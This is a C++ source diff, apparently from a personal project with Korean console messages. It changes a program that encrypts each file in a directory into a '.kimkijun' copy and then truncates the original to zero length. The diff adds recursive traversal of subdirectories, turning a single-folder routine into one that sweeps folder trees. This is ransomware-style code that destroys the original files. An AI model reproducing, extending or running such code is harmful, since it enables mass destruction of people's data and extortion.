@@ -24,54 +24,61 @@ public:
 		cout << "start" << endl;
 	}
 
-	string setpath(string a)
+	string setpath(string work, string rawpath)
 	{
-		string b = "D:\\Test\\";
-		b += a;
-		return b;
+		work += rawpath;
+		return work;
 	}
 
-	list<string> dirList()
+	list<string> dirList(string startpath)
 	{
 		list<string>  list1;
 		list<string>::iterator itor;
 		itor = list1.begin();
 
-		string path = "D:\\Test\\*.*";
+		string path = startpath + "\\*.*";
 
 		struct _finddata_t fd;
 
 		intptr_t handle;
 
 		if ((handle = _findfirst(path.c_str(), &fd)) == -1L)
-
 			cout << "No file in directory!" << endl;
 
 		while (_findnext(handle, &fd) == 0)
 		{
-			list1.push_back(setpath(fd.name));
+			cout << fd.name << endl;
+			if (string(fd.name)=="..")
+				continue;
+			else
+				list1.push_back(setpath(startpath+"\\", fd.name));
 		}
 
 		_findclose(handle);
+
+		in(list1);
 
 		return list1;
 	}
 
 	void in(list<string> TargetList)
 	{
-		for (list<string>::iterator itor = TargetList.begin(); itor != TargetList.end(); itor++)
+		for(const auto var:TargetList)
 		{
-			OpenFile = fopen(itor->c_str(), "rb");
+			OpenFile = fopen(var.c_str(), "rb");
 
-			cout << "암호화 할 파일명" << itor->c_str() << endl;
+			cout << "암호화 할 파일명" << var.c_str() << endl;
 
 			if (OpenFile == nullptr)
 			{
-				cout << "파일이 존재하지 않습니다." << endl;
+				cout << endl << endl << "다른 폴더로 !!" << endl << endl;
+
+				cout << var << "파일이 존재하지 않습니다." << endl;
+				dirList(var);
 			}
 			else
 			{
-				CName = *itor + ".kimkijun";
+				CName = var + ".kimkijun";
 				cout << "암호화된 파일명 : " << CName << endl;
 				WriteFile = fopen(CName.c_str(), "w+b");
 
@@ -83,7 +90,7 @@ public:
 
 				fclose(OpenFile);
 
-				FILE * initialStream = fopen(itor->c_str(), "w+");
+				FILE * initialStream = fopen(var.c_str(), "w+");
 				fclose(initialStream);
 
 				fclose(WriteFile);
@@ -97,51 +104,6 @@ public:
 int main(void)
 {
 	File a;
-	a.in(a.dirList());
+	a.dirList("D:\\Test");
 	return 0;
 }
-
-//#include <iostream>
-//#include <Windows.h>
-//#include <io.h>
-//#include <string>
-//#include <list>
-//#include <algorithm>
-//
-//using namespace std;	
-//
-//void p(string a)
-//{
-//	string b = "D:\\Test\\";
-//	b += a;
-//	cout << b << endl;
-//}
-//
-//int main()
-//{
-//	list<string>  list1;
-//	list<string>::iterator itor;
-//	itor = list1.begin();
-//
-//	string path = "D:\\Test\\*.*";
-//
-//	struct _finddata_t fd;
-//
-//	intptr_t handle;
-//
-//	if ((handle = _findfirst(path.c_str(), &fd)) == -1L)
-//
-//		cout << "No file in directory!" << endl;
-//
-//	while (_findnext(handle, &fd) == 0)
-//	{
-//		list1.push_back(fd.name);
-//	}
-//
-//	_findclose(handle);	
-//	
-//	for (itor = list1.begin(); itor != list1.end(); itor++)
-//	{
-//		p(*itor);
-//	}
-//}
